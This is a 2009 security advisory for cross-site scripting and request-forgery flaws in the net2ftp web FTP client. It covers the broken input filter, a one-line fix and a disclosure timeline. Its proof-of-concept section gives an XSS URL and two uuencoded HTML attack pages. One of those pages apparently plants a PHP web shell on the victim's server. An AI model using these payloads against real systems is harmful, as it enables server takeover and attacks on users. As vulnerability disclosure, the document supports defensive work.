@@ -1,0 +1,187 @@
+#=cicatriz <c1c4tr1z@voodoo-labs.org>=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(advisories)=#
+				     /)           /)     /)                   
+			_ _  _______(/ ________  // _   (/_ _       _____  _  
+			(/__(_)(_)(_(_(_)(_)    (/_(_(_/_) /_)_ o  (_)/ (_(_/_
+						                         .-/  
+#=net2ftp <= 0.97 Cross-Site Scripting/Request Forgery=#=~~~~~~~~~~~~~~~(_/~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Advisory & Vulnerability Information=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+	Title: net2ftp <= 0.97 Cross-Site Scripting/Request Forgery
+	Advisory ID: VUDO-2009-0804
+	Advisory URL: http://research.voodoo-labs.org/advisories/3
+	Date founded: 2009-04-02
+	Vendors contacted: net2ftp
+	Class: Multiple Vulnerabilities
+	Remotely Exploitable: Yes
+	Localy Exploitable: No
+	Exploit/PoC Available: Yes
+	Policy: Full Disclosure Policy (RFPolicy) v2.0
+
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Tested & Vulnerable packages=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+	[+] net2ftp 0.97
+	[+] net2ftp 0.95
+	
+	Beta:
+		[*] net2ftp 0.98 beta
+	
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Solutions and Workarounds=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+The vendor didn't released any fix/update.
+
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Technical Information=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+Multiple vulnerabilities were found on the package net2ftp [1], version 0.98 and below. Two types of
+vulnerabilities were found: Cross-Site Scripting and Cross-Site Request Forgery.
+
+[*] Cross-Site Scripting (XSS):
+
+	This vulnerability it's produced by a "typo" in the function validateGeneriInput(), where the
+	extraction of characters < and > fails because the regular expression in charge of the extraction 
+	it's invalid.
+	
+	+++includes/registerglobals.inc.php @@ 1088:1102
+	  1088  function validateGenericInput($input) {
+	  1089
+	  1090  // --------------
+	  1091  // Remove the following characters <>
+	  1092  // --------------
+	  1093
+	  1094  // Remove XSS code
+	  1095  //      $input = RemoveXSS($input);
+	  1096
+	  1097  // Remove < >
+XXX	  1098		$input = preg_replace("/\\<\\>]/", "", $input);
+	  1099	
+	  1100		return $input;
+	  1101	
+	  1102	} // end validateGenericInput
+	---includes/registerglobals.inc.php
+	
+	This can be easily fixed adding a "[" character to the pattern:
+	
+	+++
+	$input = preg_replace("/[\\<\\>]/", "", $input);
+	---
+
+[*] Cross-Site Request Forgery (CSRF):
+
+	All the forms on the web application are vulnerable because they doesn't check any type of token to
+	ensure that the user submited the form. So an attacker can trick the user to visit a website with this
+	type of method and perform certain actions on the server, like create files, delete/rename/upload/etc.
+	
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Proof of Concept=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+[*] Cross-Site Scripting (XSS):
+
+	+++
+	http://ftp.victim.com/?state=login_small&errormessage=<iframe onload="alert(/voodoo/.source);">
+	---
+	
+[*] Cross-Site Request Forgery (CSRF):
+	
+	With this HTML page an attacker can create a evil PHP script on the user's server. (uuencoded)
+	
+	+++
+	begin 644 attack.html
+	M/&AT;6P^"CQB;V1Y/@H)/&9O<FT@:60](D5D:71&;W)M(B!A8W1I;VX](FAT
+	M='!S.B\O9G1P+G9I8W1I;2YC;VTO:6YD97@N<&AP(B!O;G-U8FUI=#TB(B!M
+	M971H;V0](G!O<W0B/@H)"3QI;G!U="!N86UE/2)F='!S97)V97(B('9A;'5E
+	M/2)V:6-T:6TN9G1P<V5R=F5R+F-O;2(@='EP93TB:&ED9&5N(CX*"0D\:6YP
+	M=70@;F%M93TB9G1P<V5R=F5R<&]R="(@=F%L=64](C(Q(B!T>7!E/2)H:61D
+	M96XB/@H)"3QI;G!U="!N86UE/2)U<V5R;F%M92(@=F%L=64](G9I8W1I;75S
+	M97)N86UE(B!T>7!E/2)H:61D96XB/@H)"3QI;G!U="!N86UE/2)L86YG=6%G
+	M92(@=F%L=64](F5N(B!T>7!E/2)H:61D96XB/@H)"3QI;G!U="!N86UE/2)S
+	M:VEN(B!V86QU93TB:6YD:6$B('1Y<&4](FAI9&1E;B(^"@D)/&EN<'5T(&YA
+	M;64](F9T<&UO9&4B('9A;'5E/2)B:6YA<GDB('1Y<&4](FAI9&1E;B(^"@D)
+	M/&EN<'5T(&YA;64](G!A<W-I=F5M;V1E(B!V86QU93TB>65S(B!T>7!E/2)H
+	M:61D96XB/@H)"3QI;G!U="!N86UE/2)S<VQC;VYN96-T(B!V86QU93TB;F\B
+	M('1Y<&4](FAI9&1E;B(^"@D)/&EN<'5T(&YA;64](G9I97=M;V1E(B!V86QU
+	M93TB;&ES="(@='EP93TB:&ED9&5N(CX*"0D\:6YP=70@;F%M93TB<V]R="(@
+	M=F%L=64](B(@='EP93TB:&ED9&5N(CX*"0D\:6YP=70@;F%M93TB<V]R=&]R
+	M9&5R(B!V86QU93TB(B!T>7!E/2)H:61D96XB/@H)"3QI;G!U="!N86UE/2)S
+	M=&%T92(@=F%L=64](F5D:70B('1Y<&4](FAI9&1E;B(^"@D)/&EN<'5T(&YA
+	M;64](G-T871E,B(@=F%L=64](B(@='EP93TB:&ED9&5N(CX*"0D\:6YP=70@
+	M;F%M93TB9&ER96-T;W)Y(B!V86QU93TB+R(@='EP93TB:&ED9&5N(CX*"0D\
+	M:6YP=70@;F%M93TB<V-R965N(B!V86QU93TB,R(@='EP93TB:&ED9&5N(CX*
+	M"@D)/&EN<'5T(&YA;64](G1E>'1A<F5A5'EP92(@=F%L=64](B(@='EP93TB
+	M:&ED9&5N(CX*"0D\<V5L96-T(&YA;64](G1E>'1A<F5A4V5L96-T(B!I9#TB
+	M=&5X=&%R96%396QE8W0B(&]N8VAA;F=E/2)D;V-U;65N="YF;W)M<ULG161I
+	M=$9O<FTG72YS8W)E96XN=F%L=64],CMD;V-U;65N="YF;W)M<ULG161I=$9O
+	M<FTG72YT97AT87)E851Y<&4N=F%L=64]9&]C=6UE;G0N9F]R;7-;)T5D:71&
+	M;W)M)UTN=&5X=&%R96%396QE8W0N;W!T:6]N<UMD;V-U;65N="YF;W)M<ULG
+	M161I=$9O<FTG72YT97AT87)E85-E;&5C="YS96QE8W1E9$EN9&5X72YV86QU
+	M93MD;V-U;65N="YF;W)M<ULG161I=$9O<FTG72YS=6)M:70H*3LB/@H)"3QO
+	M<'1I;VX@=F%L=64](G!L86EN(B!S96QE8W1E9#TB<V5L96-T960B/DYO<FUA
+	M;"!T97AT87)E83PO;W!T:6]N/@H)"3PO<V5L96-T/@H)"3QI;G!U="!C;&%S
+	M<STB:6YP=70B(&YA;64](F5N=')Y(B!T>7!E/2)T97AT(B!V86QU93TB979I
+	M;"YP:'`B/CQB<CX*"0D\=&5X=&%R96$@;F%M93TB=&5X="(@8VQA<W,](F5D
+	M:70B(')O=W,](C,S(B!S='EL93TB=VED=&@Z(#DY)3LB('=R87`](F]F9B(@
+	M;VYK97ED;W=N/2)486)497AT*"DB/CP_/6![)%]'151;)V-M9"==?6`_/CPO
+	M=&5X=&%R96$^"@D\+V9O<FT^"CQS8W)I<'0^"F1O8W5M96YT+F9O<FUS6S!=
+	G+G-U8FUI="@I.PH\+W-C<FEP=#X*"CPO8F]D>3X*/"]H=&UL/@H*
+	`
+	end
+	---
+
+[*] CSRF + XSS:
+	
+	This is a Cross-Site Request Forgery attack that creates a simple Cross-Site Scripting attack in the
+	"Bookmark" section. It can be even worse because the bookmark string can be written according to the
+	attacker needs and the XSS vector can be permanent if the user saves that bookmark (and the string
+	it's also vulnerable to XSS). (uuencoded)
+	
+	+++
+	begin 644 xss-csrf-attack.html
+	M/&AT;6P^"CQB;V1Y/@H)/&9O<FT@:60](E-T871U<V)A<D9O<FTB(&%C=&EO
+	M;CTB:'1T<',Z+R]F='`N=FEC=&EM+F-O;2]I;F1E>"YP:'`B(&]N<W5B;6ET
+	M/2(B(&UE=&AO9#TB<&]S="(^"@D)/&EN<'5T(&YA;64](F9T<'-E<G9E<B(@
+	M=F%L=64](G9I8W1I;2YF='!S97)V97(N8V]M(B!T>7!E/2)H:61D96XB/@H)
+	M"3QI;G!U="!N86UE/2)F='!S97)V97)P;W)T(B!V86QU93TB,C$B('1Y<&4]
+	M(FAI9&1E;B(^"@D)/&EN<'5T(&YA;64](G5S97)N86UE(B!V86QU93TB=FEC
+	M=&EM=7-E<FYA;64B('1Y<&4](FAI9&1E;B(^"@D)/&EN<'5T(&YA;64](FQA
+	M;F=U86=E(B!V86QU93TB96XB('1Y<&4](FAI9&1E;B(^"@D)/&EN<'5T(&YA
+	M;64](G-K:6XB('9A;'5E/2)I;F1I82(@='EP93TB:&ED9&5N(CX*"0D\:6YP
+	M=70@;F%M93TB9G1P;6]D92(@=F%L=64](F)I;F%R>2(@='EP93TB:&ED9&5N
+	M(CX*"0D\:6YP=70@;F%M93TB<&%S<VEV96UO9&4B('9A;'5E/2)Y97,B('1Y
+	M<&4](FAI9&1E;B(^"@D)/&EN<'5T(&YA;64](G-S;&-O;FYE8W0B('9A;'5E
+	M/2)N;R(@='EP93TB:&ED9&5N(CX*"0D\:6YP=70@;F%M93TB=FEE=VUO9&4B
+	M('9A;'5E/2)L:7-T(B!T>7!E/2)H:61D96XB/@H)"3QI;G!U="!N86UE/2)S
+	M;W)T(B!V86QU93TB(B!T>7!E/2)H:61D96XB/@H)"3QI;G!U="!N86UE/2)S
+	M;W)T;W)D97(B('9A;'5E/2(B('1Y<&4](FAI9&1E;B(^"@D)/&EN<'5T(&YA
+	M;64](G-T871E(B!V86QU93TB8F]O:VUA<FLB('1Y<&4](FAI9&1E;B(^"@D)
+	M/&EN<'5T(&YA;64](G-T871E,B(@=F%L=64](FUA:6XB('1Y<&4](FAI9&1E
+	M;B(^"@D)/&EN<'5T(&YA;64](F1I<F5C=&]R>2(@=F%L=64](B\B('1Y<&4]
+	M(FAI9&1E;B(^"@H)"3QI;G!U="!N86UE/2)U<FPB('9A;'5E/2)J879A<V-R
+	M:7!T.F%L97)T*#`I.R(@='EP93TB:&ED9&5N(CX*"0D\:6YP=70@;F%M93TB
+	M=&5X="(@=F%L=64](B9L=#MI9G)A;64@<W)C/6AT='`Z+R]V;V]D;V\M;&%B
+	M<RYO<F<@;VYL;V%D/6%L97)T*'5N97-C87!E*"]V;V]D;V\E,C!P96]P;&4A
+	M+RYS;W5R8V4I*3LF9W0[)FQT.R]I9G)A;64F9W0[(B!T>7!E/2)H:61D96XB
+	M/@H)/"]F;W)M/@H*/'-C<FEP=#X*9&]C=6UE;G0N9F]R;7-;,%TN<W5B;6ET
+	?*"D["CPO<V-R:7!T/@H*/"]B;V1Y/@H\+VAT;6P^"@``
+	`
+	end
+	---
+	
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Reporting Timeline=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+	[*] 02-04-2009: Bugs discovered.
+	[*] 03-04-2009: Voodoo contacted the vendor.
+	[*] 08-04-2009: After 5 days the vendor didn't gave any response.
+	[*] 08-04-2009: Advisory VUDO-2009-0804 published.
+
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=References=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+	[1] http://www.net2ftp.com/
+
+#=cicatriz <c1c4tr1z@voodoo-labs.org>=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(advisories)=#
+#= miÃ© 08 abr 2009 ART =#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+# milw0rm.com [2009-04-09]
